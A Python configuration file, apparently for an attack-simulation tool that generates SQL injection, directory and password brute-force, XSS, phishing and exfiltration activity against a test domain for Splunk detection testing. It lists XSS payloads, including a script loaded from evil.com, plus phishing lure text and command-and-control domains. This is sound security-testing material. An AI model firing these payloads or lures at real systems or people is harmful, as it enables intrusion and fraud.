from datetime import datetime

#########################
# Global Configurations #
#########################

now = datetime.now()
date_time = now.strftime("%Y-%m-%d %H:%M:%S")

TENANT_DOMAIN = "agatha.com"
SPLUNK_HOST = "www.agatha.com:8000"

##################################
# Module-Specific Configurations #
##################################

# Web Server
WEB_SVR = "www.agatha.com"
# BAD_BOT_USER_AGENT = "sqlmap/1.3.11#stable (http://sqlmap.org)"
SQLMAP_QUERY_PATH = "orderdetail.aspx?Id=1"
DIR_WORD_LIST_PATH = "dataset/directory_wordlist_mini.txt"
PATH_TO_WD_DATA = r"C:\Users\Administrator\Documents\gib-intel\data\web_defacements.csv"
WEB_DEFACEMENT_ENTRY = f"https://iuat.agatha.com,{date_time}"
PW_WORD_LIST_PATH = "dataset/password_wordlist_mini.txt"
WEB_SVR_USER = "john"
WEB_SVR_LOGIN_PATH = "/login.php"
HYDRA_FAILURE_MSG = "Incorrect username/password"
XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(2)'>Click me</a>",
    "<script>document.write('<img src='x' onerror='alert(3)' />');</script>",
    "<div onmouseover='alert(4)'>Hover me</div>",
    "<iframe src='javascript:alert(5)'></iframe>",
    "<script src='http://evil.com/xss.js'></script>",
    "<svg/onload=alert(6)>",
    "<body onload=alert(7)>",
    "<input type='image' src='x' onerror='alert(8)'>",
    "<marquee onstart='alert(9)'>Scrolling Text</marquee>",
]

# Mail Server
MAIL_SVR = "agatha.com"
MAIL_PROFILE = "postfix"
DATA_EXFILTRATION_SIZE = 12500000
PHISHING_IOC_SUBJ = "Important"
PHISHING_IOC_BODY = "Dear customer, an important message is waiting for you. Please click the link below to view it:\n\n"
PHISHING_CAMPAIGN_DOMAIN = "duckdns.org"
PHISHING_CAMPAIGN_BODY = (
    "Dear customer, please click the link below: helmutz.com.15-235-9-25.cprapid.com"
)

# Win Host
C2_DOMAIN = "guardeduppe.com"
PHISHING_DOMAIN = "agcyber.com"
